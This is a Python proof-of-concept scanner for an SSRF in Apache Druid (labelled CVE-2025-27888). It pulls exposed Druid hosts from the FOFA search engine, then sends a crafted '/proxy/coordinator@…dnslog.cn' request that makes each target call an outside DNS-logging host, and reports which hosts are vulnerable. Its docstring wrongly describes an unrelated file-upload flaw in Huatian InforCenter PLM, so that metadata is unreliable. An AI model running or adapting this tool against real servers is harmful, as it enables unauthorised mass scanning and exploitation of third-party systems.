"""
name: Apache Druid存在服务端请求伪造漏洞SSRF
CVE编号: CVE-2025-27888
fofa 搜索: title="apache druid"
漏洞类型: SSRF（请求伪造漏洞）
"""
import os.path
import sys
from src import api, utils
from urllib.parse import urljoin

__all__ = [
    "search",
    "start"
]


def search(email, key):
    fofa = api.FOFA(email=email, key=key)
    result = fofa.search('title="apache druid"')
    return fofa.add_url(result)


def start(host, *args, **kwargs):
    """
    InforCenter PLM是面向制造业产品全生命周期管理业务过程，旨在为企业提供从需求收集、产品设计、工艺设计到车间生产的智能制造管理平台。华天软件Inforcenter PLM uploadFileTolls接口存在任意文件上传漏洞
    :param host: 目标地址
    :param args:
    :param kwargs:
    :return:
    """
    url = urljoin(host, "/proxy/coordinator@kcsyrcxysbfzqrxu.ov0e5o.dnslog.cn")

    try:
        response = utils.requests_url(url=url, method='get', *args, **kwargs)

        if response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        return False


if __name__ == '__main__':
    vuln_name = os.path.basename(__file__).split('.')[0]
    if len(sys.argv) < 2:
        print(f"python <{vuln_name}> <host>")
        sys.exit()
    parameter = sys.argv[1]
    r_type = start(parameter)
    if r_type:
        print(f"{parameter} vuln {vuln_name}: True")
    else:
        print(f"{parameter} vuln {vuln_name}: False")
